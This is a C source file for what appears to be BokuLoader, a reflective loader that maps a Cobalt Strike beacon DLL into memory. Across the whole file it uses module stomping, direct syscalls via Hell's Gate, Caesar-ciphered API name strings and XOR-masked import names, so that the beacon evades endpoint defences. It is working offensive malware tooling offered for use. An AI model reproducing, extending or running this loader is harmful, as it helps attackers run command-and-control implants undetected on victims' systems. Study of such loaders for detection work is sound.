#include "BokuLoader.h"

__declspec(dllexport) void* WINAPI BokuLoader()
{
    APIS api;
    SIZE_T size;
    void * base;
    Dll rdll_dst, rdll_src;
    unsigned int oldprotect = 0;
    unsigned int newprotect = 0;
    void* hMapFile = NULL;
    RtlSecureZeroMemory(&rdll_dst,sizeof(rdll_dst));
    RtlSecureZeroMemory(&rdll_src,sizeof(rdll_src));

    // Get Raw beacons base address
    rdll_src.dllBase = returnRDI();
    parseDLL(&rdll_src);

    getApis(&api);

    rdll_dst.dllBase = NULL;
    // Check if DLL Module stomping option is enabled from the C2 profile via allocator code 0x4 written by UDRL Aggressor script
    if ((*(USHORT *)((char*)rdll_src.dllBase + 0x40)) == 0x4){
        // LoadLibraryExA(
        //    DLL to stomp UTF8 string,
        //    hFile = 0 ;This parameter is reserved for future use. It must be NULL.
        //    DONT_RESOLVE_DLL_REFERENCES  (0x00000001) ; the system does not call DllMain
        base = api.LoadLibraryExA(((char*)rdll_src.dllBase+0x44),0,1);
        //rdll_dst.dllBase = ((char*)base + 0x3000);
        base = ((char*)base + 0x3000);
        oldprotect = 0;
        if(base){
            size = rdll_src.size + 0x2000;
            // Change memory protections of loaded beacon .text section to RW
            oldprotect = 0;
            // NtProtectVirtualMemory syscall
            HellsGate(getSyscallNumber(api.pNtProtectVirtualMemory));
            ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, PAGE_READWRITE, &oldprotect);
            RtlSecureZeroMemory(base,size);
            rdll_dst.dllBase = base;
        }
    }
    else if ((*(USHORT *)((char*)rdll_src.dllBase + 0x40)) == 0x3){
        size = ((char*)rdll_src.size + 0x10000);
        unsigned __int64 align = 0xFFFFFFFFFFFFF000;
        base = api.HeapAlloc(api.GetProcessHeap(),0x8,size); // 0x8 = zero out heap memory
        base = (void*)((char*)base + 0x2000);
        base = (void*)((unsigned __int64)base & align);
        if(base){
            oldprotect = 0;
            rdll_dst.dllBase = base;
            HellsGate(getSyscallNumber(api.pNtProtectVirtualMemory));
            ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, PAGE_READWRITE, &oldprotect);
        }
    }
    else if ((*(USHORT *)((char*)rdll_src.dllBase + 0x40)) == 0x2){
        size = rdll_src.size;
        hMapFile = api.CreateFileMappingA(NtCurrentProcess(),0,PAGE_EXECUTE_READWRITE,0,size,0);
        if(hMapFile){
            rdll_dst.dllBase = api.MapViewOfFile(hMapFile,0xF003F,0,0,0);
            if(base){
                oldprotect = 0;
                rdll_dst.dllBase = base;
                HellsGate(getSyscallNumber(api.pNtProtectVirtualMemory));
                ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, PAGE_READWRITE, &oldprotect);
            }
        }
    }
    else{
        // Allocate new memory to write our new RDLL too
        base = NULL;
        size = rdll_src.size;
        HellsGate(getSyscallNumber(api.pNtAllocateVirtualMemory));
        ((tNtAlloc)HellDescent)(NtCurrentProcess(), &base, 0, &size, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
        RtlSecureZeroMemory(base,size); // Zero out the newly allocated memory

        rdll_dst.dllBase = base;
    }
 
    doSections(&rdll_dst, rdll_src);
    doImportTable(&api, &rdll_dst, rdll_src);
    doRelocations(&api, &rdll_dst, rdll_src);
   
    // Get the entry point for beacon located in the .text section
    rdll_dst.EntryPoint = getBeaconEntryPoint(rdll_dst.dllBase, rdll_src.OptionalHeader);

    // Change memory protections of loaded beacon .text section to RX
    oldprotect = 0;
    base = rdll_dst.TextSection;
    size = rdll_dst.TextSectionSize;
    newprotect = PAGE_EXECUTE_READ;
    // NtProtectVirtualMemory syscall
    HellsGate(getSyscallNumber(api.pNtProtectVirtualMemory));
    ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, newprotect, &oldprotect);

    // DLL_PROCESS_ATTACH 1
    // The DLL is being loaded into the virtual address space of the current process. DLLs can use this opportunity to initialize any instance data or to use the TlsAlloc function to allocate a thread local storage (TLS) index.
    // https://learn.microsoft.com/en-us/windows/win32/dlls/dllmain
    // Calling the entrypoint of beacon with DLL_PROCESS_ATTACH is required as this resolves the hellopacket information and then returns to the caller.
    ((DLLMAIN)rdll_dst.EntryPoint)(rdll_dst.dllBase, DLL_PROCESS_ATTACH, NULL);
    return rdll_dst.EntryPoint;
}

void doSections(Dll * rdll_dst, Dll * rdll_src){
    // Save .text section address and size for destination RDLL so we can make it RE later
    int textSectionFlag = FALSE;
    int ObfuscateFlag   = FALSE;
    rdll_dst->TextSection = NULL;
    rdll_dst->TextSectionSize = 0;
    unsigned long numberOfSections = rdll_src->NumberOfSections;
    rdll_src->NthSection      = add(rdll_src->OptionalHeader, rdll_src->SizeOfOptionalHeader);
    Section section;
    while( numberOfSections-- )
    {
        __asm__(
            "add rax, 0xC \n"   // offsetof(IMAGE_SECTION_HEADER, VirtualAddress)
            "xor rcx, rcx \n"
            "mov ecx, [rax] \n"
            "xchg rax, rcx \n"
            : "=r" (section.RVA)        // RAX OUT
            : "r" (rdll_src->NthSection) // RAX IN
        );
        section.dst_rdll_VA = add(rdll_dst->dllBase, section.RVA);
        __asm__(
            "add rax, 0x14 \n"  // offsetof(IMAGE_SECTION_HEADER, PointerToRawData)
            "xor rcx, rcx \n"
            "mov ecx, [rax] \n"
            "xchg rax, rcx \n"
            : "=r" (section.PointerToRawData) // RAX OUT
            : "r" (rdll_src->NthSection)       // RAX IN
        );
        section.src_rdll_VA = add(rdll_src->dllBase, section.PointerToRawData);
        __asm__(
            "add rax, 0x10 \n"  // offsetof(IMAGE_SECTION_HEADER, SizeOfRawData)
            "xor rcx, rcx \n"
            "mov ecx, [rax] \n"
            "xchg rax, rcx \n"
            : "=r" (section.SizeOfSection) // RAX OUT
            : "r" (rdll_src->NthSection)    // RAX IN
        );
        // check if this is the .text section
        if (textSectionFlag == FALSE)
        {
            __asm__(
                "mov rcx, [rax] \n"        // name of the section
                "mov r8, 0xB7BBA6B7ED \n" // 0xB7BBA6B7ED == '.text' XOR 0xC3
                "cmp rcx, r8 \n"
                "jne notObfuscated \n"
                "mov rax, 0xC3  \n"        // ObfuscateFlag == TRUE
                "jmp exitTextTest \n"
              "notObfuscated: \n"
                "mov rax, 0x0  \n"        // ObfuscateFlag == FALSE
              "exitTextTest: \n"
                : "=r" (ObfuscateFlag)        // RAX OUT
                : "r" (rdll_src->NthSection)  // RAX IN
            );
            // Save the .text section address & size for later so we can change it from RW to RE. This has to be done after we do relocations
            rdll_dst->TextSection     = section.dst_rdll_VA;
            rdll_dst->TextSectionSize = section.SizeOfSection;
            if(ObfuscateFlag == 0xC3)
            {
                rdll_dst->obfuscate = 0xC3C3C3C3C3C3C3C3;
            }
            textSectionFlag = TRUE;
        }
        // Copy the section from the source address to the destination for the size of the section
        Memcpy(section.dst_rdll_VA, section.src_rdll_VA, section.SizeOfSection);
        // Get the address of the next section header and loop until there are no more sections
        rdll_src->NthSection += 0x28; // sizeof( IMAGE_SECTION_HEADER ) = 0x28
    }
}

void doImportTable(APIS * api, Dll * rdll_dst, Dll * rdll_src){
    void *ImportDirectory, *importEntryHint, *BaseOrdinal, *TableIndex, *EntryAddress, *importNameRVA, *LookupTableEntry, *AddressTableEntry, *EntryName, *nullCheck;
    unsigned __int64 len_importName, len_EntryName;
    // Get the address of our RDLL's Import Directory entry in within the Data Directory of the Optional Header
    void* DataDirectory = rdll_src->OptionalHeader + 0x78;
    // Get the Address of the Import Directory from the Data Directory
    char * importName;
    __asm__(
        "xor rcx, rcx \n"
        "mov ecx, [rax] \n" // RVA of Import Directory
        "add rdx, rcx \n"   // Import Directory of beacon = RVA of Import Directory + New RDLL Base Address
        "xchg rax, rdx \n"
        : "=r" (ImportDirectory) // RAX OUT
        : "r" (DataDirectory),   // RAX IN
          "r" (rdll_dst->dllBase) // RDX IN
    );
    void* nImportDesc = ImportDirectory;
    Dll dll_import;
    __asm__(
        "xor rcx, rcx \n"
        "add rdx, 0xC \n"   // 12 (0xC) byte offset is the address of the Name RVA within the image import descriptor for the DLL we are importing
        "mov ecx, [rdx] \n" // Move the 4 byte unsigned long of IMAGE_IMPORT_DESCRIPTOR->Name into Ecx
        "mov rdx, rcx \n"
        "add rax, rdx \n"        // Address of Module String = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name
        : "=r" (importNameRVA),   // RDX OUT
          "=r" (importName)       // RAX OUT
        : "r" (rdll_dst->dllBase), // RAX IN
          "r" (nImportDesc)       // RDX IN
    );
    // The last entry in the image import directory is all zeros
    while(importNameRVA)
    {
        if(rdll_dst->obfuscate){
            len_importName = (unsigned __int64)StringLengthA(importName);
            xorc(len_importName, importName, XORKEY);
            dll_import.dllBase = xLoadLibrary(importName); 
            xorc(len_importName, importName, XORKEY); // remask the import DLL name
        }else{
            dll_import.dllBase = xLoadLibrary(importName); 
        }
        __asm__(
            "xor rcx, rcx \n"   // importLookupTableEntry = VA of the OriginalFirstThunk
            "mov ecx, [rax] \n" // Move the 4 byte unsigned long of IMAGE_IMPORT_DESCRIPTOR->OriginalFirstThunk into Ecx
            "add rcx, rdx \n"   // importLookupTableEntry = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->OriginalFirstThunk
            "xchg rax, rcx \n"
            : "=r" (LookupTableEntry) // RAX OUT
            : "r" (nImportDesc),      // RAX IN        
              "r" (rdll_dst->dllBase)  // RDX IN
        );
        __asm__(
            "xor rcx, rcx \n"   // importAddressTableEntry = VA of the IAT (via first thunk not origionalfirstthunk)
            "add rax, 0x10 \n"  // 16 (0x10) byte offset is the address of the unsigned long FirstThunk within the image import descriptor
            "mov ecx, [rax] \n" // Move the 4 byte unsigned long of IMAGE_IMPORT_DESCRIPTOR->FirstThunk into Ecx
            "add rcx, rdx \n"   // importAddressTableEntry = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->FirstThunk
            "xchg rax, rcx \n"
            : "=r" (AddressTableEntry) // RAX OUT
            : "r" (nImportDesc),       // RAX IN
              "r" (rdll_dst->dllBase)   // RDX IN
        );
        __asm__(
            "mov rax, [rax] \n"
            : "=r" (nullCheck)        // RAX OUT
            : "r" (AddressTableEntry) // RAX IN
        );
        while(nullCheck)
        {
            parseDLL(&dll_import);

            if( LookupTableEntry && ((PIMAGE_THUNK_DATA)LookupTableEntry)->u1.Ordinal & IMAGE_ORDINAL_FLAG )
            {
                __asm__( // Export Base Ordinal from the Export Directory of the module/dll being imported (0x10 offset)
                    "xor rdx, rdx \n"   // located in the Export Directory in memory of the module which functions/api's are being imported
                    "add rax, 0x10 \n"  // unsigned long Base; // 0x10 offset // RCX = &importedDllBaseOrdinal
                    "mov edx, [rax] \n" // RAX = importedDllBaseOrdinal (Value/unsigned long)
                    "xchg rax, rdx \n"
                    : "=r" (BaseOrdinal)                // RAX OUT
                    : "r" (dll_import.Export.Directory) // RAX IN
                );
                __asm__( // Import Hint from the modules Hint/Name table
                    "mov rax, [rax] \n"  // RAX = 8000000000000013. 13 is the original Thunk, now we need to get rid of the 8
                    "and eax, 0xFFFF \n" // get rid of the 8
                    : "=r" (importEntryHint) // RAX OUT
                    : "r" (LookupTableEntry) // RAX IN
                );
                __asm__( // Use the import entries Hint and the Imported Modules Base Ordinal from its Export Directory to find the index of our entry/import within the Export Address Table
                    "sub rax, rdx \n" // Import Hint from Hint/Name Table (first 2 bytes before the name string)
                    : "=r" (TableIndex)      // RAX OUT
                    : "r" (importEntryHint), // RAX IN
                      "r" (BaseOrdinal)      // RDX IN
                );
                __asm__( // The ExportAddressTable/AddressOfFunctions holds unsigned long (4 byte) RVA's for the executable functions/api's address
                    "push rbx \n"
                    "mov r11, rdx \n"
                    "xor rbx, rbx \n"
                    "add bl, 0x4 \n"    // sizeof(unsigned long) - This is because each entry in the table is a 4 byte unsigned long which is the RVA/offset for the actual executable functions address
                    "mul rbx \n"        // importEntryExportTableIndex * sizeof(unsigned long)
                    "add rax, r11 \n"   // RVA for our functions address
                    "xor rbx, rbx \n"
                    "mov ebx, [rax] \n" // The RVA for the executable function we are importing
                    "add rcx, rbx \n"   // The executable address within the imported DLL for the function we imported
                    "xchg rax, rcx \n"
                    "pop rbx \n"
                    : "=r" (EntryAddress)                  // RAX OUT
                    : "r"(TableIndex),                     // RAX IN - importEntryExportTableIndex
                      "r"(dll_import.Export.AddressTable), // RDX IN - AddressTable
                      "r" (dll_import.dllBase)             // RCX IN - dllBase
                );
                // patch in the address for this imported function
                __asm__(
                    "mov [rax], rdx \n" // write the address of the imported api to our import table
                    : // no outputs
                    : "r" (AddressTableEntry), // RAX IN = The import table entry we are going to overwrite
                      "r" (EntryAddress)       // RDX IN
                 );
            }
            else
            {
                __asm__( // If there was no ordinal/hint to import then import via the name from the import tables Hint/Name Table for the imported module
                    "mov rax, [rax] \n" // RVA for our functions Name/Hint table entry
                    "add rax, rdx \n"   // VA (Address in memory) Name/Hint Entry = RVA Name/Hint Entry + New RDLL Address
                    "add rax, 0x2 \n"   // The hint is the first 2 bytes, then its followed by the name string for our import. We need to drop the first 2 bytes so we just have the name string
                    : "=r" (EntryName)         // RAX OUT
                    : "r" (AddressTableEntry), // RAX IN, import table entry we are going to overwrite / The RVA for our functions Name/Hint Table entry
                      "r" (rdll_dst->dllBase)   // RDX IN
                );
                // patch in the address for this imported function
                if(rdll_dst->obfuscate){
                    len_EntryName = (unsigned __int64)StringLengthA(EntryName);
                    xorc(len_EntryName, EntryName, XORKEY);
                    EntryAddress = xGetProcAddress(EntryName, &dll_import);
                    xorc(len_EntryName, EntryName, XORKEY); // remask the import entry name
                }else{
                    EntryAddress = xGetProcAddress(EntryName, &dll_import);
                }
                __asm__(
                    "mov [rax], rdx \n" // write the address of the imported api to our import table
                    : // no outputs
                    : "r" (AddressTableEntry), // RAX OUT, import table entry we are going to overwrite
                      "r" (EntryAddress)       // RDX IN
                );
            }
            AddressTableEntry += 0x8;
            if(LookupTableEntry)
                LookupTableEntry += 0x8;
            __asm__(
                "mov rax, [rax] \n"
                : "=r" (nullCheck)        // RAX OUT
                : "r" (AddressTableEntry) // RAX IN
            );
        }
        nImportDesc += 0x14; // 0x14 = 20 = sizeof( IMAGE_IMPORT_DESCRIPTOR )
        __asm__( // Do this again for the next module/DLL in the Import Directory
            "xor rcx, rcx \n"
            "add rax, 0xC  \n"  // 12(0xC) byte offset is the address of the Name RVA within the image import descriptor for the DLL we are importing
            "mov ecx, [rax] \n" // Move the 4 byte unsigned long of IMAGE_IMPORT_DESCRIPTOR->Name
            "mov rax, rcx \n"   // RVA of Name DLL
            "add rdx, rax \n"   // Address of Module String = newRdllAddr + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name
            : "=r" (importName),     // RDX OUT
              "=r" (importNameRVA)   // RAX OUT
            : "r" (nImportDesc),     // RAX IN
              "r" (rdll_dst->dllBase) // RDX IN
        );
    }
}

void doRelocations(APIS * api, Dll * rdll_dst, Dll * rdll_src){
    void* nextRelocBlock, *RelocDirSize, *BaseAddressDelta, *relocBlockSize, *relocVA, *RelocBlockEntries, *nextRelocBlockEntry;
    __asm__(
        "add rdx, 0x18 \n"  // OptionalHeader.ImageBase
        "mov rdx, [rdx] \n"
        "sub rax, rdx \n"   // dllBase.ImageBase
        : "=r" (BaseAddressDelta)       // RAX OUT
        : "r" (rdll_dst->dllBase),       // RAX IN
          "r" (rdll_src->OptionalHeader) // RDX IN
    );
    void* RelocDir = rdll_src->OptionalHeader + 0x98; // OptionalHeader+0x98 = &DataDirectory[Base Relocation Table]
    __asm__(
        "xor rcx, rcx \n"
        "mov ecx, [rdx] \n" // 4 byte unsigned long Virtual Address of the Relocation Directory table
        "add rax, rcx \n"   // newRelocationTableAddr = dllBase + RVAnewRelocationTable
        : "=r" (nextRelocBlock)   // RAX OUT
        : "r" (rdll_dst->dllBase), // RAX IN
          "r" (RelocDir)          // RDX IN
    );
    __asm__(
        "xor rcx, rcx \n"
        "mov ecx, [rax+0x4] \n" // 4 byte unsigned long Size of the Relocation Directory table
        "xchg rax, rcx \n"
        : "=r" (RelocDirSize) // RAX OUT
        : "r" (RelocDir)      // RAX IN
    );

    if(RelocDirSize && BaseAddressDelta) // check if their are any relocations present
    {
        __asm__(
            "xor rcx, rcx \n"
            "mov ecx, [rax+0x4] \n" // 4 byte unsigned long of (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->SizeOfBlock
            "xchg rax, rcx \n"
            : "=r" (relocBlockSize) // RAX OUT
            : "r" (nextRelocBlock)  // RAX IN
        );
        while(relocBlockSize)
        {
            __asm__(
                "xor rcx, rcx \n"
                "mov ecx, [rdx] \n" // 4 byte unsigned long of (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->VirtualAddress
                "add rax, rcx \n"   // &reflectiveDll.dll + nextRelocationBlockRVA = VA of next Relocation Block
                : "=r" (relocVA)          // RAX OUT
                : "r" (rdll_dst->dllBase), // RAX IN
                  "r" (nextRelocBlock)    // RDX IN
            );
            __asm__(
                "xor rdx, rdx \n"
                "mov rcx, 0x2 \n" // 0x2 = size of image relocation WORD
                "sub ax, 0x8 \n"  // Minus the 8 byte IMAGE_BASE_RELOCATION structure which tells us the RVA for the block and the blocksize
                "div cx \n"       // relocBlockSize/2
                : "=r" (RelocBlockEntries) // RAX OUT
                : "r" (relocBlockSize)     // RAX IN
            );
            nextRelocBlockEntry = nextRelocBlock + 0x8;
            while( RelocBlockEntries-- )
            {
                __asm__(
                    "push rbx \n"
                    "xor rbx, rbx \n"
                    "mov bx, [rax] \n"  // 2 byte value for the Relocation Entry (with the 4 bit type and 12 bit offset)
                    "mov rax, rbx \n"
                    "shr rbx, 0x0C \n"  // Check the 4 bit type
                    "cmp bl, 0x0A \n"   // IMAGE_REL_BASED_DIR64?
                    "jne badtype \n"
                    "shl rax, 0x34 \n"  // only keep the last 12 bits of RAX by shaking the RAX register
                    "shr rax, 0x34 \n"  // the last 12 bits is the offset, the first 4 bits is the type
                    "add rdx, rax \n"   // in memory Virtual Address of our current relocation entry
                    "mov rbx, [rdx] \n" // value of the relocation entry
                    "add rbx, rcx \n"   // value of our relocation entry + the hardcoded Addr:Our Real in memory VA delta we calculated earlier
                    "mov [rdx], rbx \n" // WRITE THAT RELOC!
                    "badtype:\n"
                    "pop rbx \n"
                    : // no outputs
                    : "r" (nextRelocBlockEntry), // RAX IN
                      "r" (relocVA),             // RDX IN
                      "r" (BaseAddressDelta)     // RCX IN
                );
                nextRelocBlockEntry += 0x2;
            }
            nextRelocBlock = add(nextRelocBlock, relocBlockSize);
            __asm__(
                "xor rcx, rcx \n"
                "mov ecx, [rax+0x4] \n" // 4 byte unsigned long of (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->SizeOfBlock
                "xchg rax, rcx \n"
                : "=r" (relocBlockSize) // RAX OUT
                : "r" (nextRelocBlock)  // RAX IN
            );
        }
    }
}

void parseDLL(Dll * dll){
    dll->NewExeHeader         = getNewExeHeader(dll->dllBase);
    dll->size                 = getDllSize(dll->NewExeHeader);
    dll->SizeOfHeaders        = getDllSizeOfHeaders(dll->NewExeHeader);
    dll->OptionalHeader       = getOptionalHeader(dll->NewExeHeader);
    dll->SizeOfOptionalHeader = getSizeOfOptionalHeader(dll->NewExeHeader);
    dll->NumberOfSections     = getNumberOfSections(dll->NewExeHeader);
    dll->Export.Directory     = getExportDirectory(dll->dllBase);
    dll->Export.DirectorySize = getExportDirectorySize(dll->dllBase);
    dll->Export.AddressTable  = getExportAddressTable(dll->dllBase, dll->Export.Directory);
    dll->Export.NameTable     = getExportNameTable(dll->dllBase, dll->Export.Directory);
    dll->Export.OrdinalTable  = getExportOrdinalTable(dll->dllBase, dll->Export.Directory);
    dll->Export.NumberOfNames = getNumberOfNames(dll->Export.Directory);
}

void getApis(APIS * api){
    Dll k32, ntdll;
        // Get Export Directory and Export Tables for NTDLL.DLL
    // Original String:   nTDlL.Dll // String Length:     9 // Caesar Chiper Key: 513556 // Chiper String:     hX`BX
    unsigned char s_ntdll[] = {0x82,0x68,0x58,0x80,0x60,0x42,0x58,0x80,0x80,0x00};
    basicCaesar_Decrypt(9, s_ntdll, 513556);
    ntdll.dllBase = getDllBase((char *)s_ntdll);
    parseDLL(&ntdll);

    // Get Export Directory and Export Tables for Kernel32.dll
    // Original String:   kERneL32.dLl // String Length:     12 // Caesar Chiper Key: 1 // Chiper String:     lFSofM43/eMm
    unsigned char s_k32[] = {0x6c,0x46,0x53,0x6f,0x66,0x4d,0x34,0x33,0x2f,0x65,0x4d,0x6d,0x01};
    basicCaesar_Decrypt(13, s_k32, 1);
    k32.dllBase = getDllBase((char *)s_k32);
    parseDLL(&k32);

    unsigned char kstr1[] = {0x36,0x59,0x4b,0x4e,0x36,0x53,0x4c,0x5c,0x4b,0x5c,0x63,0x2b,0x00};
    basicCaesar_Decrypt(12, kstr1, 234);
    api->LoadLibraryA = xGetProcAddress(kstr1, &k32);

    unsigned char ntstr2[] = {0x87,0xad,0x7a,0xa5,0xa5,0xa8,0x9c,0x9a,0xad,0x9e,0x8f,0xa2,0xab,0xad,0xae,0x9a,0xa5,0x86,0x9e,0xa6,0xa8,0xab,0xb2,0x00};
    basicCaesar_Decrypt(23, ntstr2, 1337);
    api->pNtAllocateVirtualMemory = xGetProcAddress(ntstr2, &ntdll);

    unsigned char ntstr3[] = {0xc4,0xea,0xc6,0xe8,0xe5,0xea,0xdb,0xd9,0xea,0xcc,0xdf,0xe8,0xea,0xeb,0xd7,0xe2,0xc3,0xdb,0xe3,0xe5,0xe8,0xef,0x00};
    basicCaesar_Decrypt(22, ntstr3, 1010101110);
    api->pNtProtectVirtualMemory = xGetProcAddress(ntstr3, &ntdll);

    unsigned char ntstr4[] = {0x23,0x49,0x1b,0x47,0x3a,0x3a,0x2b,0x3e,0x47,0x49,0x4a,0x36,0x41,0x22,0x3a,0x42,0x44,0x47,0x4e,0x00};
    basicCaesar_Decrypt(19, ntstr4, 13013);
    api->pNtFreeVirtualMemory = xGetProcAddress(ntstr4, &ntdll);

    char str_LdrLoadDll[] = {0x53,0x6b,0x79,0x53,0x76,0x68,0x6b,0x4b,0x73,0x73,0};
    basicCaesar_Decrypt(10,str_LdrLoadDll,7);
    api->LdrLoadDll = xGetProcAddress(str_LdrLoadDll, &ntdll);

    char str_RtlAnsiStringToUnicodeString[] = {0x85,0xa7,0x9f,0x74,0xa1,0xa6,0x9c,0x86,0xa7,0xa5,0x9c,0xa1,0x9a,0x87,0xa2,0x88,0xa1,0x9c,0x96,0xa2,0x97,0x98,0x86,0xa7,0xa5,0x9c,0xa1,0x9a,0};
    basicCaesar_Decrypt(28,str_RtlAnsiStringToUnicodeString,51);
    api->RtlAnsiStringToUnicodeString = xGetProcAddress(str_RtlAnsiStringToUnicodeString, &ntdll);

    char str_LdrGetProcedureAddress[] = {0x57,0x6f,0x7d,0x52,0x70,0x7f,0x5b,0x7d,0x7a,0x6e,0x70,0x6f,0x80,0x7d,0x70,0x4c,0x6f,0x6f,0x7d,0x70,0x7e,0x7e,0};
    basicCaesar_Decrypt(22,str_LdrGetProcedureAddress,11);
    api->LdrGetProcedureAddress = xGetProcAddress(str_LdrGetProcedureAddress, &ntdll);

    char str_RtlFreeUnicodeString[] = {0xab,0xcd,0xc5,0x9f,0xcb,0xbe,0xbe,0xae,0xc7,0xc2,0xbc,0xc8,0xbd,0xbe,0xac,0xcd,0xcb,0xc2,0xc7,0xc0,0};
    basicCaesar_Decrypt(20,str_RtlFreeUnicodeString,89);
    api->RtlFreeUnicodeString = xGetProcAddress(str_RtlFreeUnicodeString, &ntdll);
    
    char str_RtlInitAnsiString[] = {0x93,0xb5,0xad,0x8a,0xaf,0xaa,0xb5,0x82,0xaf,0xb4,0xaa,0x94,0xb5,0xb3,0xaa,0xaf,0xa8,0};
    basicCaesar_Decrypt(17,str_RtlInitAnsiString,65);
    api->RtlInitAnsiString = xGetProcAddress(str_RtlInitAnsiString, &ntdll);

    char str_NtUnmapViewOfSection[] = {0x8a,0xb0,0x91,0xaa,0xa9,0x9d,0xac,0x92,0xa5,0xa1,0xb3,0x8b,0xa2,0x8f,0xa1,0x9f,0xb0,0xa5,0xab,0xaa,0};
    basicCaesar_Decrypt(20,str_NtUnmapViewOfSection,60);
    api->NtUnmapViewOfSection = xGetProcAddress(str_NtUnmapViewOfSection, &ntdll);

    char str_NtQueryVirtualMemory[] = {0xa5,0xcb,0xa8,0xcc,0xbc,0xc9,0xd0,0xad,0xc0,0xc9,0xcb,0xcc,0xb8,0xc3,0xa4,0xbc,0xc4,0xc6,0xc9,0xd0,0};
    basicCaesar_Decrypt(20,str_NtQueryVirtualMemory,87);
    api->NtQueryVirtualMemory = xGetProcAddress(str_NtQueryVirtualMemory, &ntdll);

    unsigned char str_LoadLibraryExA[] = {0x59,0x7c,0x6e,0x71,0x59,0x76,0x6f,0x7f,0x6e,0x7f,0x86,0x52,0x85,0x4e,0x00};
    basicCaesar_Decrypt(14,str_LoadLibraryExA,13);
    api->LoadLibraryExA = xGetProcAddress(str_LoadLibraryExA, &k32);

    unsigned char str_CreateFileMappingA[] = {0x6f,0x9e,0x91,0x8d,0xa0,0x91,0x72,0x95,0x98,0x91,0x79,0x8d,0x9c,0x9c,0x95,0x9a,0x93,0x6d,0x00};
    basicCaesar_Decrypt(18,str_CreateFileMappingA,44);
    api->CreateFileMappingA = xGetProcAddress(str_CreateFileMappingA, &k32);

    unsigned char str_MapViewOfFile[] = {0x70,0x84,0x93,0x79,0x8c,0x88,0x9a,0x72,0x89,0x69,0x8c,0x8f,0x88,0x00};
    basicCaesar_Decrypt(13,str_MapViewOfFile,35);
    api->MapViewOfFile = xGetProcAddress(str_MapViewOfFile, &k32);

    unsigned char str_RtlAllocateHeap[] = {0x85,0xa7,0x9f,0x74,0x9f,0x9f,0xa2,0x96,0x94,0xa7,0x98,0x7b,0x98,0x94,0xa3,0x00};
    basicCaesar_Decrypt(15,str_RtlAllocateHeap,51);
    api->HeapAlloc = xGetProcAddress(str_RtlAllocateHeap, &ntdll);

    unsigned char str_GetProcessHeap[] = {0x56,0x74,0x83,0x5f,0x81,0x7e,0x72,0x74,0x82,0x82,0x57,0x74,0x70,0x7f,0x00};
    basicCaesar_Decrypt(14,str_GetProcessHeap,15);
    api->GetProcessHeap = xGetProcAddress(str_GetProcessHeap, &k32);

    
}
void * xLoadLibrary(void * library_name){
        // Check if the DLL is already loaded and the entry exists in the PEBLdr
        void* LibraryAddress = getDllBase(library_name);
        // If the DLL is not already loaded into process memory, use LoadLibraryA to load the imported module into memory
        if (LibraryAddress == NULL){
            APIS api;
            ANSI_STRING    ANSI_Library_Name;
            UNICODE_STRING UNICODE_Library_Name;

            RtlSecureZeroMemory( &api,                  sizeof( APIS ) );
            RtlSecureZeroMemory( &ANSI_Library_Name,    sizeof( ANSI_Library_Name ) );
            RtlSecureZeroMemory( &UNICODE_Library_Name, sizeof( UNICODE_Library_Name ) );

            getApis(&api);

            // Change ASCII string to ANSI struct string
            api.RtlInitAnsiString(&ANSI_Library_Name,library_name);
            // RtlAnsiStringToUnicodeString converts the given ANSI source string into a Unicode string.
            // 3rd arg = True = routine should allocate the buffer space for the destination string. the caller must deallocate the buffer by calling RtlFreeUnicodeString.
            api.RtlAnsiStringToUnicodeString( &UNICODE_Library_Name, &ANSI_Library_Name, TRUE );

            api.LdrLoadDll(NULL, 0,&UNICODE_Library_Name,&LibraryAddress);
            // cleanup
            api.RtlFreeUnicodeString( &UNICODE_Library_Name );
        }
        return LibraryAddress;
}

void * xGetProcAddress(void * symbolStr, Dll * dll) {
    unsigned __int64 StrSize = (unsigned __int64)( (char*)StringLengthA((char*)symbolStr) + 1);
    void * address = getSymbolAddress(symbolStr, StrSize, dll->dllBase, dll->Export.AddressTable, dll->Export.NameTable, dll->Export.OrdinalTable, dll->Export.NumberOfNames);

    if (!address){
        APIS api;
        Dll ntdll;
        ANSI_STRING ANSI_Function_string;
        void* hModule;
        RtlSecureZeroMemory( &ANSI_Function_string, sizeof( ANSI_STRING ) );

        unsigned char s_ntdll[] = {0x82,0x68,0x58,0x80,0x60,0x42,0x58,0x80,0x80,0x00};
        basicCaesar_Decrypt(9, s_ntdll, 513556);
        ntdll.dllBase = getDllBase((char *)s_ntdll);
        parseDLL(&ntdll);
        char str_LdrGetProcedureAddress[] = {0x57,0x6f,0x7d,0x52,0x70,0x7f,0x5b,0x7d,0x7a,0x6e,0x70,0x6f,0x80,0x7d,0x70,0x4c,0x6f,0x6f,0x7d,0x70,0x7e,0x7e,0};
        basicCaesar_Decrypt(22,str_LdrGetProcedureAddress,11);
        api.LdrGetProcedureAddress = getSymbolAddress(str_LdrGetProcedureAddress, 23, ntdll.dllBase, ntdll.Export.AddressTable, ntdll.Export.NameTable, ntdll.Export.OrdinalTable, ntdll.Export.NumberOfNames);

        char str_RtlInitAnsiString[] = {0x93,0xb5,0xad,0x8a,0xaf,0xaa,0xb5,0x82,0xaf,0xb4,0xaa,0x94,0xb5,0xb3,0xaa,0xaf,0xa8,0};
        basicCaesar_Decrypt(17,str_RtlInitAnsiString,65);
        api.RtlInitAnsiString = getSymbolAddress(str_RtlInitAnsiString, 18, ntdll.dllBase, ntdll.Export.AddressTable, ntdll.Export.NameTable, ntdll.Export.OrdinalTable, ntdll.Export.NumberOfNames);

        api.RtlInitAnsiString(&ANSI_Function_string,symbolStr);
        api.LdrGetProcedureAddress(dll->dllBase,&ANSI_Function_string,NULL,&address);
    }
    return address;
}

// Havoc C2 function
SIZE_T StringLengthA(LPCSTR String)
{
    LPCSTR String2;

    if ( String == NULL )
        return 0;

    for (String2 = String; *String2; ++String2);

    return (String2 - String);
}

// Havoc C2 function
